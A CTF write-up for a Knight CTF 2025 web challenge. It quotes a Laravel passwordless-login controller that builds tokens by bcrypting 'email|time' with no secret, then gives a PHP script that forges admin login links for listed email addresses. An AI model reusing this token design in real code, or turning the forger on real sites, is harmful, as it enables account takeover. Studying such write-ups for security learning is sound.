---
date: 2025-01-22
description: Insecure login function using tokens
platform: Knight CTF 2025
categories: Web
tags:
  - insecure-design
  - broken-access-control
duration:
---
Laravel application with standard register/login functionality. To get the flag user must elevate privileges to admin. 
- `requestLoginUrl` - generates login URL to be used for `loginUsingLink`
- `loginUsingLink` - login using email address, with valid tokens

# Vulnerability

## AuthController.php
```php
    public function requestLoginUrl(Request $request) {
        $request->validate([
            'email' => 'required|email',
        ]);

        $user = User::where('email', $request->email)->first();

        if (!$user) {
            return back()->withErrors(['email' => 'Email not found']);
        }

        $time = time();
        $data = $user->email . '|' . $time;
        $token = bcrypt($data);

        $loginUrl = url('/login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($user->email));

        return back()->with('success', 'Login link generated, but email sending is disabled.');
    }
    public function loginUsingLink(Request $request) {
        $token = $request->query('token');
        $time = $request->query('time');
        $email = $request->query('email');

        if (!$token || !$time || !$email) {
            return response('Invalid token or missing parameters', 400);
        }

        if (time() - $time > 3600) {
            return response('Token expired', 401);
        }

        $data = $email . '|' . $time;
        if (!Hash::check($data, $token)) {
            return response('Token validation failed', 401);
        }

        $user = User::where('email', $email)->first();

        if (!$user) {
            return response('User not found', 404);
        }

        session(['user_id' => $user->id]);
        session(['is_admin' => $user->is_admin]);

        return redirect()->route('users');
    }
```

## web.php
```php
    Route::get('/login-link', [AuthController::class, 'loginUsingLink']);
```
# notes: 
- valid emails can be found in contact page 
- bcrypt rounds 12 `__solve.py`?

## login_link_generator.php
```php
<?php
$emails = [
    "admin1@knightconnect.com",
    "admin@knightconnect.com",
    "tech@knightconnect.com",
    "sponsorship@knightconnect.com",
    "partnership@knightconnect.com",
    "nomanprodhan@knightconnect.com",
    "jannat@knightconnect.com",
    "hello@knightconnect.com",
    "root@knightconnect.com"
];
foreach ($emails as $email) {
    $time = time();
    $data = $email.'|'.$time;
    $token = password_hash($data, PASSWORD_BCRYPT);
    $login_url = "https://kctf2025-knightconnect.knightctf.com/login-link?" . 
        "token=" . urlencode($token) . 
        "&time=" . $time . 
        "&email=" . urlencode($email);

    echo "link: \n$login_url\n\n";
}
?>
```

